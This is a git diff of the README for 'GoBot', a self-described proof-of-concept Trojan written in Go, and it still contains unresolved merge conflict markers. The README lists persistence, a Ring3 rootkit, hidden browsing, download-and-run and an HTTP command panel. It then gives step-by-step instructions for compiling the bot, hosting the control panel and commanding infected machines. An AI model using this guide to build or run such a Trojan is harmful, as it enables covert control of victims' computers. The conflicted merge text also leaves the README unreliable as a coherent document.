@@ -1,11 +1,14 @@
 # GoBot
 
-GoBot is a project i am doing as i learn Go. GoBot is a PoC(Proof of Concept) Trojan that uses HTTP connections for commands and sending information.
+GoBot is a project i am working on as i learn Go. GoBot is a PoC(Proof of Concept) Trojan that uses HTTP connections for commands and sending information.
 
 # Under-Development, Always
 
-While i keep teaching myself Go, i will be updating this project. If at anytime someone would like to add to the project they can. Just post in the 'issues' section and i will add you code and credits to the main project.
+While i keep teaching myself Go, i will be updating this project. If at anytime someone would like to add to the project they can. Just post in the 'issues' section and i will add your code and credits to the main project.
 
+<<<<<<< HEAD
+# Current Features
+=======
 # Current Abilitys
 
 * Basic Registry and AppData install
@@ -17,8 +20,31 @@ While i keep teaching myself Go, i will be updating this project. If at anytime 
 * Single Instance
 
 # I don't know what i am doing!
+>>>>>>> origin/master
 
-Yes, I really don't know what i am doing. This is a learning experince for me. I have coded in languages like Visual Basic .NET for my whole life so the syntax is vary foreign to me. I am sorry. There isn't much for me to learn from as Go is a new, but fast growing language.
+* Basic Registry and AppData install
+* Base64 Encoding/Decoding
+* Uniqe ID Generation (MD5)
+* Message Box
+* Install
+* Open Website - Visable
+* Open Website - Hidden
+* Single Instance
+* Ring3 Rootkit
+* Download and Run
+* Open Program
+* Simple to use Control Panel
+
+# How to Build and Use
+
+* Use the command go get https://github.com/SaturnsVoid/GoBot
+* Edit the settings to your liking in GoBot.go
+* Compile GoBot.go with the other folder inside src
+* Edit the Control Panels settings (Key = your login to see the control panel)
+* Import the MySQL database
+* Upload the Control Panel to a secure server
+* Run GoBot
+* Command from Control Panel (Example Panel Login: http://127.0.0.1/gobot.php?cmd=key)
 
 # Current Credits and Stuff
 
@@ -30,13 +56,39 @@ Yes, I really don't know what i am doing. This is a learning experince for me. I
 * https://github.com/golang/go/wiki/WindowsDLLs
 * http://vxheaven.org/forum/index.php
 * https://mmcgrana.github.io/2012/09/go-by-example-timers-and-tickers.html
+<<<<<<< HEAD
+* https://github.com/petercunha/GoAT
+=======
+>>>>>>> origin/master
 
+# Terms of Use
+
+	* Do NOT use this on any computer you do not own, or are allowed to run this on.
+	* Credits must always be given, With linksback to here.
+	* You may NEVER attempt to sell this, its free and open source.
+	
 # Other
 
 Go is a amazing and powerful programming language. If you already haven't, check it out; https://golang.org/
 
 
 ----------Update Log---------------------
+<<<<<<< HEAD
+10/11/2015 @ 5:15PM:
+- Rewrote how checking internet connection is done
+- New Ring3 Rootkit (https://github.com/petercunha/GoAT)
+- New Install Method (https://github.com/petercunha/GoAT)
+- New Control Panel
+- Download and Run (for exe's)
+- Run Program (exe, bat, ect..)
+- Added 1 minute delay before connecting to panel (Security)
+- Fixed custom "Check Command" timer
+- Send basic information to Control Panel
+- New DebugLog feature
+- Code Cleaning
+- Removed Uninstall (Have to rewrite it to work with new Rootkit and Install)
+=======
+>>>>>>> origin/master
 
 10/07/2015 @ 1:40PM:
 - Rewrote GoBot.php to do the basics to test that the bot works.
